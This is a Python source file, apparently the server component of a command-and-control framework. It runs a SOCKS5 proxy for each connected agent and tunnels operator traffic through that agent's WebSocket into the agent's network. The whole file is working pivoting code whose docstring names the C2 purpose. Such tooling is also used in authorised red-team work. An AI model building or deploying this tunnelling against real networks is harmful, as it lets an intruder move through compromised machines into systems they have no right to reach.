"""
SOCKS5 Proxy Server for Agent Tunneling

This service creates a local SOCKS5 proxy for each connected agent,
allowing the C2 to route traffic through the agent's network.
"""

import asyncio
import struct
import socket
import logging
from typing import Dict, Optional
from uuid import UUID
import base64

logger = logging.getLogger(__name__)


class AgentSOCKSProxy:
    """SOCKS5 proxy that tunnels through an agent WebSocket"""
    
    def __init__(self, agent_id: UUID, agent_websocket, local_port: int):
        self.agent_id = agent_id
        self.agent_ws = agent_websocket
        self.local_port = local_port
        self.server = None
        self.active_connections: Dict[str, asyncio.StreamWriter] = {}
        self.request_counter = 0
    
    async def start(self):
        """Start SOCKS5 proxy server"""
        try:
            self.server = await asyncio.start_server(
                self.handle_client,
                '127.0.0.1',
                self.local_port
            )
            logger.info(f"[SOCKS] Agent {self.agent_id}: Proxy started on 127.0.0.1:{self.local_port}")
            return self.server
        except Exception as e:
            logger.error(f"[SOCKS] Failed to start proxy for agent {self.agent_id}: {e}")
            raise
    
    async def stop(self):
        """Stop SOCKS5 proxy server"""
        if self.server:
            self.server.close()
            await self.server.wait_closed()
            logger.info(f"[SOCKS] Agent {self.agent_id}: Proxy stopped")
    
    async def handle_client(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        """Handle SOCKS5 client connection"""
        try:
            # SOCKS5 handshake: version + nmethods + methods
            data = await reader.read(2)
            if len(data) < 2:
                writer.close()
                return
            
            version, nmethods = struct.unpack('!BB', data)
            
            if version != 5:
                logger.warning(f"[SOCKS] Unsupported SOCKS version: {version}")
                writer.close()
                return
            
            # Read authentication methods
            methods = await reader.read(nmethods)
            
            # Respond: version 5, no authentication required (0x00)
            writer.write(struct.pack('!BB', 5, 0))
            await writer.drain()
            
            # Read connection request: VER + CMD + RSV + ATYP + DST.ADDR + DST.PORT
            data = await reader.read(4)
            if len(data) < 4:
                writer.close()
                return
            
            version, cmd, _, atyp = struct.unpack('!BBBB', data)
            
            if cmd != 1:  # Only support CONNECT (1)
                # Reply: connection refused
                writer.write(struct.pack('!BBBBIH', 5, 7, 0, 1, 0, 0))
                await writer.drain()
                writer.close()
                return
            
            # Parse destination address
            if atyp == 1:  # IPv4
                addr_data = await reader.read(4)
                target_host = socket.inet_ntoa(addr_data)
            elif atyp == 3:  # Domain name
                addr_len_data = await reader.read(1)
                addr_len = struct.unpack('!B', addr_len_data)[0]
                target_host = (await reader.read(addr_len)).decode('utf-8')
            elif atyp == 4:  # IPv6
                addr_data = await reader.read(16)
                target_host = socket.inet_ntop(socket.AF_INET6, addr_data)
            else:
                # Unsupported address type
                writer.write(struct.pack('!BBBBIH', 5, 8, 0, 1, 0, 0))
                await writer.drain()
                writer.close()
                return
            
            # Read port
            port_data = await reader.read(2)
            target_port = struct.unpack('!H', port_data)[0]
            
            logger.info(f"[SOCKS] Agent {self.agent_id}: Connect request to {target_host}:{target_port}")
            
            # Generate unique request ID
            request_id = f"{self.agent_id}_{self.request_counter}"
            self.request_counter += 1
            
            # Store client writer for relaying responses
            self.active_connections[request_id] = writer
            
            # Send connect request to agent via WebSocket
            await self.agent_ws.send_json({
                "type": "socks_connect",
                "request_id": request_id,
                "target_host": target_host,
                "target_port": target_port
            })
            
            # Wait for connection confirmation from agent (with timeout)
            # Note: This will be handled by handle_agent_message
            
            # Send success reply to client
            # BND.ADDR and BND.PORT are set to 0 for simplicity
            writer.write(struct.pack('!BBBBIH', 5, 0, 0, 1, 0, 0))
            await writer.drain()
            
            # Start relaying data between client and agent
            await self.relay_client_to_agent(request_id, reader)
            
        except Exception as e:
            logger.error(f"[SOCKS] Client handling error: {e}")
        finally:
            try:
                writer.close()
                await writer.wait_closed()
            except:
                pass
    
    async def relay_client_to_agent(self, request_id: str, reader: asyncio.StreamReader):
        """Relay data from SOCKS client to agent"""
        try:
            while True:
                data = await reader.read(4096)
                if not data:
                    break
                
                # Send data to agent
                await self.agent_ws.send_json({
                    "type": "socks_data",
                    "request_id": request_id,
                    "data": base64.b64encode(data).decode()
                })
        except Exception as e:
            logger.error(f"[SOCKS] Relay to agent error: {e}")
        finally:
            # Close connection on agent side
            try:
                await self.agent_ws.send_json({
                    "type": "socks_close",
                    "request_id": request_id
                })
            except:
                pass
            
            # Remove from active connections
            if request_id in self.active_connections:
                del self.active_connections[request_id]
    
    async def handle_agent_message(self, message: dict):
        """Handle messages from agent (SOCKS responses)"""
        msg_type = message.get("type")
        request_id = message.get("request_id")
        
        if msg_type == "socks_connected":
            logger.info(f"[SOCKS] Agent connected to target (request {request_id})")
        
        elif msg_type == "socks_data":
            # Relay data from agent to client
            if request_id in self.active_connections:
                writer = self.active_connections[request_id]
                data = base64.b64decode(message.get("data", ""))
                try:
                    writer.write(data)
                    await writer.drain()
                except Exception as e:
                    logger.error(f"[SOCKS] Relay to client error: {e}")
                    # Close connection
                    try:
                        writer.close()
                        await writer.wait_closed()
                    except:
                        pass
                    if request_id in self.active_connections:
                        del self.active_connections[request_id]
        
        elif msg_type == "socks_error":
            error = message.get("error")
            logger.error(f"[SOCKS] Agent connection error (request {request_id}): {error}")
            # Close client connection
            if request_id in self.active_connections:
                writer = self.active_connections[request_id]
                try:
                    writer.close()
                    await writer.wait_closed()
                except:
                    pass
                del self.active_connections[request_id]


# Global registry of SOCKS proxies for connected agents
agent_socks_proxies: Dict[str, AgentSOCKSProxy] = {}


async def create_agent_proxy(agent_id: UUID, agent_websocket) -> Optional[AgentSOCKSProxy]:
    """Create SOCKS proxy for an agent"""
    # Find available port starting from 10080
    base_port = 10080
    for port in range(base_port, base_port + 1000):
        try:
            proxy = AgentSOCKSProxy(agent_id, agent_websocket, port)
            await proxy.start()
            agent_socks_proxies[str(agent_id)] = proxy
            return proxy
        except OSError:
            continue  # Port in use, try next
    
    logger.error(f"[SOCKS] No available ports for agent {agent_id}")
    return None


async def destroy_agent_proxy(agent_id: UUID):
    """Destroy SOCKS proxy for an agent"""
    agent_id_str = str(agent_id)
    if agent_id_str in agent_socks_proxies:
        proxy = agent_socks_proxies[agent_id_str]
        await proxy.stop()
        del agent_socks_proxies[agent_id_str]
        logger.info(f"[SOCKS] Proxy destroyed for agent {agent_id}")


def get_agent_proxy(agent_id: UUID) -> Optional[AgentSOCKSProxy]:
    """Get SOCKS proxy for an agent"""
    return agent_socks_proxies.get(str(agent_id))
